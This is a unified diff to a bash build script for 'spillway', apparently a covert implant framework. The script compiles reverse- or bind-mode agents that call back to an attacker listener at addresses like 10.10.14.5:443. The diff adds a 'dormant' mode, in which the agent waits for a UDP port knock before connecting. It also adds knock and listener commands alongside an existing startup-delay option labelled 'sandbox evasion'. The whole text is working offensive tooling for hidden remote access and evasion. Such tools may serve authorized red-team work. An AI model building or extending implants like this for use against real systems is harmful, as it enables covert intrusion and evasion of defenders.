@@ -41,6 +41,7 @@ usage() {
     echo -e "${TEAL}${BOLD}Modes:${RESET}"
     echo -e "  ${TEXT}reverse${RESET}  ${DIM}Agent calls back to listener${RESET}"
     echo -e "  ${TEXT}bind${RESET}     ${DIM}Agent listens, listener connects${RESET}"
+    echo -e "  ${TEXT}dormant${RESET}  ${DIM}Agent waits for knock, then calls back${RESET}"
     echo
     echo -e "${TEAL}${BOLD}Address formats:${RESET}"
     echo -e "  ${DIM}IP:PORT         10.10.14.5:443${RESET}"
@@ -60,6 +61,7 @@ usage() {
     echo -e "  ${BLUE}--proxy ADDR${RESET}       HTTP proxy address"
     echo -e "  ${BLUE}--proxy-user USER${RESET}  Proxy username"
     echo -e "  ${BLUE}--proxy-pass PASS${RESET}  Proxy password"
+    echo -e "  ${BLUE}--knock-port PORT${RESET}  UDP knock port (dormant mode) ${DIM}[49152]${RESET}"
     echo -e "  ${BLUE}--delay N${RESET}          Startup delay in seconds (sandbox evasion) ${DIM}[0]${RESET}"
     echo -e "  ${BLUE}--os OS${RESET}            Target OS: linux/windows/darwin ${DIM}[linux]${RESET}"
     echo -e "  ${BLUE}--arch ARCH${RESET}        Target arch: amd64/arm64 ${DIM}[amd64]${RESET}"
@@ -72,6 +74,7 @@ usage() {
     echo -e "  ${DIM}$0 reverse 10.10.14.5:443${RESET}"
     echo -e "  ${DIM}$0 bind 0.0.0.0:8443 --os windows --arch amd64${RESET}"
     echo -e "  ${DIM}$0 reverse 10.10.14.5 443 --all --compress${RESET}"
+    echo -e "  ${DIM}$0 dormant 10.10.14.5:443 --knock-port 49152${RESET}"
     exit 0
 }
 
@@ -146,6 +149,7 @@ build_one() {
     ldflags+=" -X main.cfgProxyUser=${OPT_PROXY_USER:-}"
     ldflags+=" -X main.cfgProxyPass=${OPT_PROXY_PASS:-}"
     ldflags+=" -X main.cfgDelay=${OPT_DELAY:-0}"
+    ldflags+=" -X main.cfgKnockPort=${OPT_KNOCK_PORT:-49152}"
     ldflags+=" -X main.cfgVersion=$(git describe --tags --always --dirty 2>/dev/null || echo dev)"
     ldflags+=" -X main.cfgBuildCommit=$(git rev-parse --short HEAD 2>/dev/null || echo unknown)"
 
@@ -184,6 +188,9 @@ build_one() {
     echo -e "  ${TEAL}Address:${RESET} ${TEXT}${ADDR}${RESET}"
     echo -e "  ${TEAL}PSK:${RESET}     ${TEXT}${masked_psk}${RESET}"
     echo -e "  ${TEAL}SNI:${RESET}     ${TEXT}${SNI}${RESET}"
+    if [[ "$MODE" == "dormant" ]]; then
+        echo -e "  ${TEAL}Knock:${RESET}   ${TEXT}UDP/${OPT_KNOCK_PORT}${RESET}"
+    fi
 
     success "Built ${output}"
 
@@ -192,6 +199,12 @@ build_one() {
     if [[ "$MODE" == "reverse" ]]; then
         echo -e "${MAUVE}${BOLD}Listener command:${RESET}"
         echo -e "  ${DIM}./bin/spillway listen --port ${ADDR##*:} --mount ./target --key ${masked_psk}${RESET}"
+    elif [[ "$MODE" == "dormant" ]]; then
+        echo -e "${MAUVE}${BOLD}Listener command:${RESET}"
+        echo -e "  ${DIM}./bin/spillway listen --port ${ADDR##*:} --mount ./target --key ${masked_psk}${RESET}"
+        echo
+        echo -e "${MAUVE}${BOLD}Knock command:${RESET}"
+        echo -e "  ${DIM}./bin/spillway knock <TARGET_IP> --port ${OPT_KNOCK_PORT} --key ${masked_psk}${RESET}"
     else
         echo -e "${MAUVE}${BOLD}Connect command:${RESET}"
         echo -e "  ${DIM}./bin/spillway connect ${ADDR} --mount ./target --key ${masked_psk}${RESET}"
@@ -206,7 +219,7 @@ build_one() {
 MODE="$1"; shift
 
 # Validate mode
-[[ "$MODE" == "reverse" || "$MODE" == "bind" ]] || error "Mode must be 'reverse' or 'bind', got: '$MODE'"
+[[ "$MODE" == "reverse" || "$MODE" == "bind" || "$MODE" == "dormant" ]] || error "Mode must be 'reverse', 'bind', or 'dormant', got: '$MODE'"
 
 [[ $# -lt 1 ]] && error "Address required. Usage: $0 <mode> <address> [options]"
 
@@ -230,6 +243,7 @@ OPT_PROXY=""
 OPT_PROXY_USER=""
 OPT_PROXY_PASS=""
 OPT_DELAY="0"
+OPT_KNOCK_PORT="49152"
 OPT_OS="linux"
 OPT_ARCH="amd64"
 OPT_ALL=0
@@ -251,6 +265,7 @@ while [[ $# -gt 0 ]]; do
         --proxy)       OPT_PROXY="$2";      shift 2 ;;
         --proxy-user)  OPT_PROXY_USER="$2"; shift 2 ;;
         --proxy-pass)  OPT_PROXY_PASS="$2"; shift 2 ;;
+        --knock-port)  OPT_KNOCK_PORT="$2"; [[ "$OPT_KNOCK_PORT" =~ ^[0-9]+$ ]] || error "--knock-port must be a positive integer"; shift 2 ;;
         --delay)       OPT_DELAY="$2"; [[ "$OPT_DELAY" =~ ^[0-9]+$ ]] || error "--delay must be a non-negative integer"; (( OPT_DELAY > 3600 )) && error "--delay max is 3600 (1 hour)"; shift 2 ;;
         --os)          OPT_OS="$2";         shift 2 ;;
         --arch)        OPT_ARCH="$2";       shift 2 ;;
